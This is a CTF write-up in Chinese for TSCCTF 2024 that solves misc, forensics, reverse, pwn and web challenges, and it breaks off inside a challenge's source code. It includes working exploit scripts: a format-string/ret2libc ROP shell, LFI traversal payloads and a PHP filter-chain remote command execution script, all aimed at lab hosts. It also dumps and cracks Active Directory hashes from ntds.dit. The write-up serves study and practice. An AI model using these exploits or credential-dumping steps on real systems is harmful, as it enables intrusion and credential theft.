---
title: TSCCTF 2024
tags: [CTF, TSCCTF]

---

# TSCCTF 2024
![image](https://hackmd.io/_uploads/BJLmu63Y6.png)

## Misc
### AKA
#### Source Code
:::spoiler IDA
```cpp=
__int64 flag_function()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  num_of_files = 0;
  sub_14000A6C0();
  here_dll = LoadLibraryA("here.dll");
  flag_dll = LoadLibraryA("flag.dll");
  ghost_dll = LoadLibraryA("ghost.dll");
  strcpy(FileName, ".\\*.*");
  FirstFileA = FindFirstFileA(FileName, &FindFileData);
  while ( FindNextFileA(FirstFileA, &FindFileData) )
  {
    while ( *(_WORD *)FindFileData.cFileName != 46
         && (*(_WORD *)FindFileData.cFileName != 11822 || FindFileData.cFileName[2]) )
    {
      num_of_files += (GetFileAttributesA(FindFileData.cFileName) & 0x10) == 0;
      if ( !FindNextFileA(FirstFileA, &FindFileData) )
        goto LABEL_6;
    }
  }
LABEL_6:
  FindClose(FirstFileA);
  if ( num_of_files > 2 )
  {
    v6 = strcpy(buf, "We don't want too many files here.");
    puts(v6);
    v7 = strcpy(buf, "Files <= 2. You have ");
    v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files);
    v9 = strcpy(v8, " file(s).");
    puts(v9);
    v10 = strcpy(buf, "Hint: Did you have short name?");
    puts(v10);
    return 0i64;
  }
  if ( !here_dll )
  {
    if ( !ghost_dll )
    {
      if ( !flag_dll )
      {
        v12 = strcpy(buf, "DLL load failed.");
        puts(v12);
        goto LABEL_12;
      }
      hint = (void (*)(void))GetProcAddress(flag_dll, "hint");
      if ( !hint )
        goto LABEL_12;
      goto LABEL_11;
    }
    goto LABEL_16;
  }
  if ( ghost_dll )
  {
LABEL_16:
    hint = (void (*)(void))GetProcAddress(ghost_dll, "Roflcopter");
    if ( !hint )
      goto LABEL_12;
    goto LABEL_11;
  }
  if ( !flag_dll )
  {
    hint = (void (*)(void))GetProcAddress(here_dll, "hint");
    if ( !hint )
    {
LABEL_12:
      FreeLibrary(here_dll);
      FreeLibrary(flag_dll);
      FreeLibrary(ghost_dll);
      return 0i64;
    }
LABEL_11:
    hint();
    goto LABEL_12;
  }
  flag = (void (*)(void))GetProcAddress(flag_dll, "flag");
  if ( flag )
    flag();
  return 0i64;
}
```
:::
#### Recon
題目給了vmdk file，先用Autopsy開，可以撈出`ghost.dll`和`where_is_the_dll.exe`兩個檔案
![圖片](https://hackmd.io/_uploads/ByGrGZuKp.png)

逆向一下會發現關鍵的code如上，接著就是考驗逆向的功力，可以稍微喵一下dll裡面export出的東西有`flag`, `Roflcopter`和`hint`這三個function
![圖片](https://hackmd.io/_uploads/SyicGbdYT.png)
不過看PE file中有提到執行資料夾中只允許有兩個file
```cpp=24
  if ( num_of_files > 2 )
  {
    v6 = strcpy(buf, "We don't want too many files here.");
    puts(v6);
    v7 = strcpy(buf, "Files <= 2. You have ");
    v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files);
    v9 = strcpy(v8, " file(s).");
    puts(v9);
    v10 = strcpy(buf, "Hint: Did you have short name?");
    puts(v10);
    return 0i64;
  }
```
並且下面接續一些判斷有無把dll成功load進來的一些判斷，所以一開始的想法是直接patch，讓他可以不需要管有多少檔案在同一個資料夾，另外一件事情是我們的目標應該會放在最後幾行
```cpp=76
  flag = (void (*)(void))GetProcAddress(flag_dll, "flag");
  if ( flag )
    flag();
  return 0i64;
```
但是如果直接讓他跳到這邊，會因為一開始沒有load進相對應的dll而發生segmentation fault，正確的做法如下
#### Exploit
首先把`ghost.dll`改成`flag.dll`，並且複製一份再rename成`here.dll`
```bash
$ ll
total 4240
drwxrwxrwx 1 sbk6401 sbk6401    4096 Jan 19 20:11 .
drwxrwxrwx 1 sbk6401 sbk6401    4096 Jan 19 22:09 ..
-rwxrwxrwx 1 sbk6401 sbk6401      46 Jan 19 20:11 final_patch.1337
-rwxrwxrwx 1 sbk6401 sbk6401 1700882 Jan 19 18:32 flag.dll
-rwxrwxrwx 1 sbk6401 sbk6401 1700882 Jan 19 18:32 here.dll
-rwxrwxrwx 1 sbk6401 sbk6401  931328 Jan 19 18:32 where_is_the_dll.exe
```
仔細看這樣的配置就會讓code直接執行到最後幾行，並且因為有成功load到`flag.dll`所以可以執行flag function，只是需要把判斷folder中有多少file的判斷patch掉
![圖片](https://hackmd.io/_uploads/Bk8IBWdKa.png)

Flag: `TSC{nTF$_IS_w3ird}`
### RGB
#### Recon
這一題也是算新瓶裝舊酒，如果把圖片丟到stegsolve並按照RGB各單一顏色區分會發現有三張不同的QRcode，拿到[online tool](https://products.aspose.app/barcode/recognize/qr#)掃描之後會出現三段FLAG，把三段拼起來就是了
#### Exploit
```python
flag_1 = "T{5_e3V15r63o_O0_ErNnCV11M45RW7"
flag_2 = "SR34_D13_3L_k0_ma_3_D0444a1_3h3"
flag_3 = "C05Rr_07A_UY0Np5R934_n1r_j1A_1}"

real_flag = ""
for i in range(len(flag_1)):
    real_flag += flag_1[i]
    real_flag += flag_2[i]
    real_flag += flag_3[i]

print(real_flag)
```

Flag: `TSC{R0535_4Re_r3D_V101375_Ar3_6LU3_Yok0_0NO_p0m5_aRE_9r33N_4nD_C0nV4114r14_Maj4115_AR3_Wh173}`
### There is nothing here(1)
#### Recon
看來我的道行還是太淺了，感謝@Salmon 給的[提示](https://blog.csdn.net/qq_45894840/article/details/128346180)，我一開始直覺也是改寬度，但是之前只有寫過bmp / png的題目，不知道jpeg怎麼改，所以就歪樓想到別的地方，繞來繞去還是回歸原點，因為題目有提示這是一個square view，所以應該是把圖片的長寬都改成`04 00`，就可以看到qrcode了，再利用stegsolve把其中一個顏色的channel extract出來，丟到[online scanner](https://products.aspose.app/barcode/recognize/qr#)就可以拿到flag了
![圖片](https://hackmd.io/_uploads/SyNdMRuYp.png)

:::spoiler Flag QR Code
![](https://imgur.com/XbnbN5X.png)
:::

Flag: `TSC{Wh47_yoU_53e_IS_noT_Wh@t_YoU_9Et}`
### There is nothing here(2)
#### Recon
由於之前第一題解不出來，所以先寫這一題，題目敘述有提到要先找問題，但我是直接開始解XDD，然後過不期然不知道要寫啥，開ticket詢問一下這一題是否和前一題有關，得到肯定的回覆後才回頭處理第一題，浪費了一些時間

1. Modify JPG
    題目只有給一個vhdx的檔案，所以我就直接丟到FTK隨便搜一下，發現了AD的一些hive file和一張jpg圖片，一想到和前一題有關就果斷想說要改長寬，果不其然，發現了題目真正問的問題是要解決AD中admin帳號的密碼爆破(原本是`01 18 01 cc`)
    ![圖片](https://hackmd.io/_uploads/S1aqnPFtp.png)
    
    ![card](https://hackmd.io/_uploads/Hy7kavKt6.jpg)
2. Hashcat in Kali
    我是參考[ Password Cracking Using Hashcat and NTDS.dit | Cyber Security Tutorial ](https://youtu.be/-pOhdbJUD0g?si=omxs2h0V5Bcho5TU)這部影片的作法(雖然之前玩AD的時候也有寫過，但我懶得翻筆記)，首先要先用impacket/secretsdump.py把==ntds.dit==和==SYSTEM== hive file的資訊彙整起來
    ```bash
    $ ./secretsdump.py -ntds ./Active\ Directory/ntds.dit -system ./registry/SYSTEM LOCAL -outputfile ./myhashes.txt
    Impacket v0.11.0 - Copyright 2023 Fortra

    [*] Target system bootKey: 0xa8b93f7180a58e68855a3bc7b78a2fee
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: e1464646eb31cceb90499786c54c1fea
    [*] Reading and decrypting hashes from ./Active Directory/ntds.dit 
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:674e48b68c5cd0efd8f7e5faa87b3d1e:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WIN-D0GK9NN045J$:1000:aad3b435b51404eeaad3b435b51404ee:8992db8791f94857ffeaad27b67b8dc1:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6ec996e19cc73dffb3f966de98837ebe:::
    [*] Kerberos keys from ./Active Directory/ntds.dit 
    Administrator:aes256-cts-hmac-sha1-96:03a66dff72701640eaa7d8525cb9a93a22cd65dea5def40c0c55d6cce5a4c56d
    Administrator:aes128-cts-hmac-sha1-96:ebdf0b0b151ee52d372429ef1e4ac45d
    Administrator:des-cbc-md5:c19b6bf4d9d3b361
    WIN-D0GK9NN045J$:aes256-cts-hmac-sha1-96:cfb8bf03caea33ebfd870400b49b5d0f53a5675ace7866baed26d1ebb0da67f9
    WIN-D0GK9NN045J$:aes128-cts-hmac-sha1-96:8069ceb2edc5ac4f76a8c595f2a09ee3
    WIN-D0GK9NN045J$:des-cbc-md5:3d3de59e9162ea6b
    krbtgt:aes256-cts-hmac-sha1-96:534850fe38ca92f7a687fc98d8282fbabb717a2803032e11f2b4b5d05f226545
    krbtgt:aes128-cts-hmac-sha1-96:835a3f9fd0a75f82d4ebed41441b01db
    krbtgt:des-cbc-md5:86290bba68d58c23
    [*] Cleaning up...
    $ cat myhashes.txt.ntds
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:674e48b68c5cd0efd8f7e5faa87b3d1e:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WIN-D0GK9NN045J$:1000:aad3b435b51404eeaad3b435b51404ee:8992db8791f94857ffeaad27b67b8dc1:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6ec996e19cc73dffb3f966de98837ebe:::
    ```
    接著才是用hashcat去爆破，而作者也很好心的把wordlist都整理好了
    ```bash
    $ hashcat -m 1000 ./myhashes.txt.ntds ./fasttrack.txt
    $ hashcat -m 1000 ./myhashes.txt.ntds ./fasttrack.txt --show --username
    Administrator:674e48b68c5cd0efd8f7e5faa87b3d1e:welcome
    Guest:31d6cfe0d16ae931b73c59d7e0c089c0:
    DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0:
    ```
    現在我們知道一部分的flag，也就是Admin的密碼為welcome，雖然直接在網路上的一些NTLM db搜尋也可以找的到這一組經典的密碼，不過就還是練習一下正規的操作

3. Domain in SYSTEM hive
    另一個flag也就是AD的FQDN，可以從SYSTEM hive中的`SYSTEM/ControlSet001/Service/Tcpip/Parameters`中找到
    ![圖片](https://hackmd.io/_uploads/rkvM1dKKT.png)
    而理論上來說FQDN應該是[hostname].[domain]兩個串在一起才是unique FQDN，但作者說其實只需要domain就好，所以最後的flag會是`TSC{tsc_ctf_AD.local_welcome}`
    
Flag: `TSC{tsc_ctf_AD.local_welcome}`
### TL;DL
#### Hint
* Hint 1
    > len(flag) > 20
* Hint 2
    > How many channels does the audio file have?
* Hint 3
    > Cogito, ergo sum
* Hint 4
    > Are you familiar with the tool used to display signal voltages?
* Hint 5
    > ![BkfafXhYa](https://hackmd.io/_uploads/rkOqByWja.png)

#### Recon
這一題真的太難了，不過也是有一點有趣，Hint也是給了超多但還是只有一個人解出來，@ywc真的太鬼了這一題也是賽後解
從題目給的hint可以知道1. 笛卡爾, 2. 直角坐標, 3. 音頻振幅
此時針對這種腦動就要越開越好，如果把振幅畫出來會怎麼樣呢?其實就是這麼簡單，但綜觀網路上的資源或是之前打過的題目都沒有這樣類似的題目，所以自己寫個script如下，嘗試把圖案畫出來。

:::info
順帶一提，看了@ywc大神的WP後才知道其實沒有那麼通靈，因為一開始import進去Audacity後雖然看似啥都沒有，我也按照之前的經驗用頻譜去看，但是依然只有看似是摩斯密碼的東西，此時只要採用正規劃就可以看出一些些端倪了
![圖片](https://hackmd.io/_uploads/ByKFrZWjT.png)

![圖片](https://hackmd.io/_uploads/ry8cr-ZoT.png)
:::
#### Exploit
順帶一題，讀取這一題的音檔不能用wave這個library，因為這一題的音檔不是一個標準的PCM編碼的.wav檔案。wave library只支援PCM編碼的.wav檔案。
```python=
from scipy.io import wavfile
import matplotlib.pyplot as plt

sample_rate, data = wavfile.read('./TSCCTF 2024/Misc/TL;DL/flag-tldl.wav')

left_channel = data[:, 0]
right_channel = data[:, 1]

plt.figure()
plt.plot(left_channel, right_channel)

# Add labels
plt.xlabel('x')
plt.ylabel('y')
plt.title('A simple plot')

plt.show()
```
![flag](https://hackmd.io/_uploads/Sk1t4JZjT.png)

Flag: `TSC{V3ry_10Ud_d1R3c7_CUrR3N7_Bu7_1n_32-b17_f1047}`
## Reverse
### sHELLcode
#### Source Code
:::spoiler IDA main function
```cpp=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  const char *v5; // ebx
  int v6; // eax
  int v7; // eax
  unsigned int i; // [esp+1Ch] [ebp-8h]

  __main();
  if ( argc == 1 )
  {
    v3 = std::operator<<<std::char_traits<char>>(&std::cout, "./sHELLcode.exe <Flag>");
    std::operator<<<std::char_traits<char>>(v3, 10);
    return 0;
  }
  else if ( strlen(argv[1]) == 33 )
  {
    for ( i = 0; i <= 0x84; ++i )
      code[i] ^= 0x87u;
    if ( (*(int (__cdecl **)(const char *))code)(argv[1]) )
    {
      v5 = argv[1];
      v6 = std::operator<<<std::char_traits<char>>(&std::cout, "Here is your flag: ");
      v7 = std::operator<<<std::char_traits<char>>(v6, v5);
      std::operator<<<std::char_traits<char>>(v7, 10);
    }
    return 0;
  }
  else
  {
    return 0;
  }
}
```
:::
#### Recon
這個也是有點有趣，也是算水題，但意義深遠，可以看到原本的code中有一個function pointer，在開始check flag之前做了decrypt，所以一開始的確不知道原本在做甚麼，但只要使用工人智慧把這一段patch掉，再用IDA重新幫忙反組譯，就可以寫script了
```python
enc_code = [  0xD2, 0x0E, 0x62, 0xD4, 0x04, 0x6B, 0x93, 0x0A, 0xC2, 0x74, 0x40, 0x87, 0xE4, 0xBF, 0xB0, 0xB1, 0xE1, 0x40, 0xC7, 0x83, 0xB4, 0x87, 0x40, 0xC2, 0x7F, 0x87, 0x87, 0x87, 0x87, 0x04, 0xFA, 0x7F, 0xA7, 0xF8, 0xD1, 0x0C, 0xC2, 0x7F, 0x0C, 0x9B, 0x02, 0xE7, 0xC6, 0xC7, 0x87, 0x0C, 0xD2, 0x7F, 0x0C, 0xC2, 0x8F, 0x86, 0x57, 0x88, 0x31, 0x87, 0x0F, 0xC2, 0x6C, 0x0C, 0xCA, 0x7F, 0x3D, 0xE0, 0xE1, 0xE1, 0xE1, 0x0E, 0x4F, 0x70, 0x6D, 0x56, 0x7D, 0x0E, 0x4F, 0x46, 0x7F, 0x98, 0xAE, 0x45, 0x0E, 0x57, 0x0E, 0x45, 0x46, 0x65, 0x85, 0x86, 0x45, 0x0E, 0x4F, 0xAE, 0x57, 0x88, 0x31, 0xC3, 0x82, 0x74, 0xB5, 0xC2, 0x6C, 0x88, 0x39, 0x47, 0xBE, 0x44, 0xF3, 0x80, 0x3F, 0x87, 0x87, 0x87, 0x87, 0x6C, 0x8C, 0x04, 0xC2, 0x7F, 0x86, 0x6C, 0x23, 0x3F, 0x86, 0x87, 0x87, 0x87, 0x04, 0x43, 0x93, 0xDC, 0xDA, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

real_code = []
for i in range(0x84):
    real_code.append("{:02x}".format(enc_code[i] ^ 0x87))
print(" ".join(real_code))
# 55 89 e5 53 83 ec 14 8d 45 f3 c7 00 63 38 37 36 66 c7 40 04 33 00 c7 45 f8 00 00 00 00 83 7d f8 20 7f 56 8b 45 f8 8b 1c 85 60 41 40 00 8b 55 f8 8b 45 08 01 d0 0f b6 00 88 45 eb 8b 4d f8 ba 67 66 66 66 89 c8 f7 ea d1 fa 89 c8 c1 f8 1f 29 c2 89 d0 89 c2 c1 e2 02 01 c2 89 c8 29 d0 0f b6 44 05 f3 32 45 eb 0f be c0 39 c3 74 07 b8 00 00 00 00 eb 0b 83 45 f8 01 eb a4 b8 01 00 00 00 83 c4 14 5b 5d c3
```
把原本encrypted code的地方改掉，再重新disassemble一下，更新如下:
```cpp
int __cdecl code(int flag)
{
  _BYTE v2[9]; // [esp+Bh] [ebp-Dh] BYREF

  strcpy(v2, "c8763");
  v2[6] = 0;
  *(_WORD *)&v2[7] = 0;
  while ( *(int *)&v2[5] <= 32 )
  {
    if ( check_string[*(_DWORD *)&v2[5]] != (char)(*(_BYTE *)(*(_DWORD *)&v2[5] + flag) ^ v2[*(_DWORD *)&v2[5] % 5]) )
      return 0;
    ++*(_DWORD *)&v2[5];
  }
  return 1;
}
```
#### Exploit
```python
enc_flag = [0x37, 0x7B, 0x7B, 0x75, 0x67, 0x25, 0x43, 0x79, 0x59, 0x44, 0x3C, 0x4D, 0x45, 0x69, 0x72, 0x3C, 0x4B, 0x7F, 0x73, 0x7F, 0x2F, 0x5B, 0x58, 0x52, 0x56, 0x3C, 0x75, 0x03, 0x45, 0x67, 0x06, 0x4A, 0x4A]

key = [51, 54, 55, 56, 99]
key = [0x63, 0x38, 0x37, 0x36, 0x33]
flag = ""
for i in range(33):
    flag += chr(enc_flag[i] ^ key[i % 5])

print(flag)
```

Flag: `TCLCTF{Now_ur_A_sHELLcode_M4sTer}`
## PWN
### ret2libc
#### Source Code
```cpp=
#include <stdio.h>
#include <stdio.h>

int main(){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	puts("Do you know the libc?");
	char str[0x20];
	scanf("%s", str);
	getchar();
	printf(str);
	gets(str);
	return 0;
}
```
#### Recon
這一題的環境很搞，我覺得以只有上過社團的新手來說應該很難，畢竟都是基本功，但說實話，用到format bug string的實用度真的不高
1. 從source code中可以發現簡單的format bug和bof的問題，所以大膽猜測先leak stack info，然後拿到libc base
2. 接著用到後面的gets達到bof + rop，然後他有開canary，所以記得canary也要放對
#### Exploit - FBS + ret2libc + BoF + ROP
:::success
到這邊應該很簡單，local也是一下子就過了，但不知道為甚麼，我發現題目給的libc.so.6和server端的不一樣，一直debug都沒有甚麼好結果，後來還是乾脆開docker在local端跑一下環境，結果竟然發現ROP的gadget真的對不到，應該說只有`pop rdx ; pop rbx ; ret`這個gadget發生問題，所以我也是直接copy出docker的libc才過的，真的是傻眼...
:::
```python
from pwn import *

# r = process('./ret2libc', env={"LD_PRELOAD" : "./libc.so.6"})
r = remote('172.31.210.1', 50002)

print(r.recvline())
payload = b'%p' * 14 + b'^'
r.sendline(payload)
stack_info = r.recvuntil(b'^')[:-1].replace(b'(nil)', b'0xdeadbeef').split(b'0x')
canary = int(stack_info[-4], 16)


libc_main = int(stack_info[-2], 16)
libc_base = libc_main - 0x24083# 0x29d90

log.info(f'{stack_info}')
log.info(f'{hex(libc_main)}')
log.info(f'{hex(libc_base)}')
log.info(f'{hex(canary)}')

pop_rax_ret = libc_base + 0x0000000000036174# 0x0000000000045eb0# : pop rax ; ret
pop_rdi_ret = libc_base + 0x0000000000023b6a# 0x000000000002a3e5# : pop rdi ; ret
pop_rsi_ret = libc_base + 0x000000000002601f# 0x000000000002be51# : pop rsi ; ret
pop_rdx_rbx_ret = libc_base + 0x0000000000015fae6# 0x00000000000904a9# : pop rdx ; pop rbx ; ret
bin_sh = libc_base + 0x00000000001b45bd# 0x00000000001d8678# : /bin/sh
syscall_ret = libc_base + 0x000000000002284d# 0x0000000000091316# : 


r.sendline(b'a' * 0x28 + p64(canary) + p64(1) + p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_rbx_ret) + p64(0) + p64(0) + p64(syscall_ret))

r.interactive()
```
### ret2win
#### Exploit - 就是簡單到不能再簡單的ret2win
```python
from pwn import *

r = remote('172.31.210.1', 50001)
# r = process('./ret2win')

r.recvline()

fn_win_addr = 0x000000000401196
r.sendline(b'a' * 0x28 + p64(fn_win_addr))
r.interactive()
```
## Web
### [教學題] 極之番『漩渦』
#### Recon
這一題有四小題，都是和PHP相關的洞，應該是個對新手都很有感覺的題目
1. 弱型別 + List
    :::spoiler Source Code
    ```php=
    <?php
    include('config.php');
    echo '<h1>👻 Stage 1 / 4</h1>';

    $A = $_GET['A'];
    $B = $_GET['B'];

    highlight_file(__FILE__);
    echo '<hr>';

    if (isset($A) && isset($B))
        if ($A != $B)
            if (strcmp($A, $B) == 0)
                if (md5($A) === md5($B))
                    echo "<a href=$stage2>Go to stage2</a>";
                else die('ERROR: MD5(A) != MD5(B)');
            else die('ERROR: strcmp(A, B) != 0');
        else die('ERROR: A == B');
    else die('ERROR: A, B should be given');
    ```
    :::
    觀察source code會發現就是一個md5 collision的經典題目，不過他還有一個限制，就是`strcmp($A, $B) == 0`，這是和之前[遇到的題目](https://hackmd.io/@SBK6401/Byy8Y_V13)不太一樣的地方，後來是參考[Bypassing PHP strcmp()](https://rst.hashnode.dev/bypassing-php-strcmp)的文章，內文提到
    > == is an insecure comparison (loose comparison known as the Equal Operator) if the two strings are equal to each other then it returns true, this does not check data types. If we submit an empty array token[]=something PHP translates GET variables like this to an empty array which causes strcmp() to barf: strcmp(array(), "token") -> NULL which will return 0

    意思是如果給的GET參數是個list，那PHP就會理解成0，因為他認為是個empty array，所以這一題和collision沒有關係，純粹是php的設計語言在弱型別以及語法上有"太多"的空間可以利用
    Payload: `http://172.31.210.1:33002/stage1.php?A[]=QNKCDZO&B[]=240610708`
    ![圖片](https://hackmd.io/_uploads/BkwaZ4tYT.png)

2. Collision Again
    :::spoiler Source Code
    ```php=
    <?php
    include('config.php');
    echo '<h1>👻 Stage 2 / 4</h1>';

    $A = $_GET['A'];
    $B = $_GET['B'];

    highlight_file(__FILE__);
    echo '<hr>';

    if (isset($A) && isset($B))
        if ($A !== $B){
            $is_same = md5($A) == 0 and md5($B) === 0;
            if ($is_same)
                echo (md5($B) ? "QQ1" : md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2");
            else die('ERROR: $is_same is false');
        }
    else die('ERROR: A, B should be given');
    ```
    :::
    這一題沒有想太多就直接用前一題的payload送出去，結果payload太強大就過了==，後來是仔細去看[教學](https://hackmd.io/@Vincent550102/BJwHYfxKp)才知道他的考點，簡單來說，在php中，`=`的運算優先度是高於`and`運算的，所以送出前一題的payload，會通過#13的判斷，因為即時後面是一個false也沒差，接著就是一個三層的if statement，用python的角度解釋就會變成
    ```python
    if md5(B):
        result = "QQ1"
    else:
        if md5(A) == 0:
            result = "<a href={0}?page=swirl.php>Go to stage3</a>".format(stage3)
        else:
            result = "QQ2"
    ```
    而因為\$B本來就沒東西，所以會進到else，必且md5(\$A)是true，所以會return Stage 3的link給我們
    Payload: `http://172.31.210.1:33002/stage2_212ad0bdc4777028af057616450f6654.php/?A[]=QNKCDZO&B[]=240610708`
    ![圖片](https://hackmd.io/_uploads/SkwCW4Ft6.png)
3. LFI
    :::spoiler Source Code
    ```php=
    <?php
    include('config.php');
    echo '<h1>👻 Stage 3 / 4</h1>';

    $page = $_GET['page'];

    highlight_file(__FILE__);
    echo '<hr>';
    if (isset($page)) {
        $path = strtolower($_GET['page']);

        // filter \ _ /
        if (preg_match("/\\_|\//", $path)) {
            echo "<p>bad hecker detect! </p>";
        }else{
            $path = str_replace("..\\", "../", $path);
            $path = str_replace("..", ".", $path);
            echo $path;
            echo '<hr>';
            echo file_get_contents("./page/".$path);
        }
    } else die('ERROR: page should be given');
    ```
    :::
    這個小題是個簡單的LFI，要找的檔案其實就是config.php(不然其實也不知道要找甚麼)，關鍵的地方在於他有設filter，簡單bypass一下就過了(把`../`變成`....%5c`就可以了)，取得config.php後就打開source code inspect一下就知道關鍵stage 4的link了
    Payload: `http://172.31.210.1:33002/stage3_099b3b060154898840f0ebdfb46ec78f.php?page=....%5cconfig.php`
    ![圖片](https://hackmd.io/_uploads/HJAS84tK6.png)
4. LFI2RCE - PHP Filter Chain
這一題是最難的，最後忍不住還是去看了教學，但跟著做還是要花好久的功夫才能打穿，這一題就是典型的LFI2RCE的題目，一開始是看[飛飛的文章](https://ithelp.ithome.com.tw/articles/10241555)，發現他可以成功query`../../../../../proc/self/environ`這個東西，所以有一大半時間都在找如何用這個東西inject webshell達到RCE，但不確定是權限不夠還是怎麼樣，過程中困難重重也沒有快要成功的跡象，因此就只能嘗試教學中提到的php filter chain，話說[steven的文章](https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/)很優質耶，已經是一個php lfi2rce的教科書了，重點是察看的payload來源於[wupco大的script](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)也是怎麼試都不成功，最後是察看[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)這篇文章才解決，我是用[他們自己寫的script](https://github.com/synacktiv/php_filter_chain_generator)，不確定是哪個環節出問題
#### Exploit
Script For Stage 4
```python=
import requests
import subprocess
from sys import *

url = "http://172.31.210.1:33002/stage4_b182g38e7db23o8eo8qwdehb23asd311.php"

command = ""
for i in argv[1:]:
    command += i + ' '

result = subprocess.Popen(['python', './php_filter_chain_generator/php_filter_chain_generator.py', '--chain', f'<?php system("{command}")?>'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

payload, _ = result.communicate()
# print(payload.splitlines())
data = {"👀": payload.splitlines()[-1]}
response = requests.post(url, data=data)
print(response.text)
```
```bash
$ python exp.py ls
<h1>👻 Stage 4 / 4</h1><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">'&lt;h1&gt;👻&nbsp;Stage&nbsp;4&nbsp;/&nbsp;4&lt;/h1&gt;'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />echo&nbsp;</span><span style="color: #DD0000">'&lt;hr&gt;'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">extract</span><span style="color: #007700">(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br /><br />if&nbsp;(isset(</span><span style="color: #0000BB">$👀</span><span style="color: #007700">))&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$👀</span><span style="color: #007700">);<br />else&nbsp;die(</span><span style="color: #DD0000">'ERROR:&nbsp;👀&nbsp;should&nbsp;be&nbsp;given'</span><span style="color: #007700">);</span>
</span>
</code><hr>bin
boot
dev
etc
flag_cr14x5hc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
�
P�������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
$ python exp.py cat /flag_cr14x5hc
<h1>👻 Stage 4 / 4</h1><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">'&lt;h1&gt;👻&nbsp;Stage&nbsp;4&nbsp;/&nbsp;4&lt;/h1&gt;'</span><span style="color: #007700">;<br /><br /></span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />echo&nbsp;</span><span style="color: #DD0000">'&lt;hr&gt;'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">extract</span><span style="color: #007700">(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br /><br />if&nbsp;(isset(</span><span style="color: #0000BB">$👀</span><span style="color: #007700">))&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$👀</span><span style="color: #007700">);<br />else&nbsp;die(</span><span style="color: #DD0000">'ERROR:&nbsp;👀&nbsp;should&nbsp;be&nbsp;given'</span><span style="color: #007700">);</span>
</span>
</code><hr>TSC{y0u_4r3_my_0ld_p4l}
�B�0���>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```

Flag: `TSC{y0u_4r3_my_0ld_p4l}`
### Palitan ng pera(賽後解)
#### Description
> It's a currency exchange website.
>
> Author: Vincent55
> Official Writeup - https://github.com/Vincent550102/My-CTF-Challenge/tree/main/TSCCTF-2024#palitan-ng-pera
#### Source Code
* docker-compose.yml
    ```dockerfile!
    version: "3.5"
    services:
        exchange:
            build:
                context: ./src
                args:
                    FLAG: TSCCTF{FAKEFLAG} 
            ports:
                - 33000:80/tcp
    ```
* Dockerfile
    ```dockerfile!
    FROM php:7.4.33-apache

    COPY . /var/www/html

    RUN chown -R www-data:www-data /var/www/html && \
        chmod -R 555 /var/www/html && \
        chown www-data:www-data /var/www/html/upload && \
        chmod 775 /var/www/html/upload

    ARG FLAG
    RUN echo $FLAG > /flag-`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`

    RUN echo "AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP" >>/etc/apache2/apache2.conf
    USER www-data
    ```
* currency.php
    :::spoiler Source Code
    ```php
    <?php

    # from https://en.wikipedia.org/wiki/List_of_circulating_currencies

    # The exchange rate are unrelated to the solution, so they are all set to 0.87 :>

    $countryData = array(
        "Afghanistan" => array("ISO" => "AFN", "toTWD" => 0.87),
        "Akrotiri and Dhekelia" => array("ISO" => "EUR", "toTWD" => 0.87),
        "Albania" => array("ISO" => "ALL", "toTWD" => 0.87),
        "Algeria" => array("ISO" => "DZD", "toTWD" => 0.87),
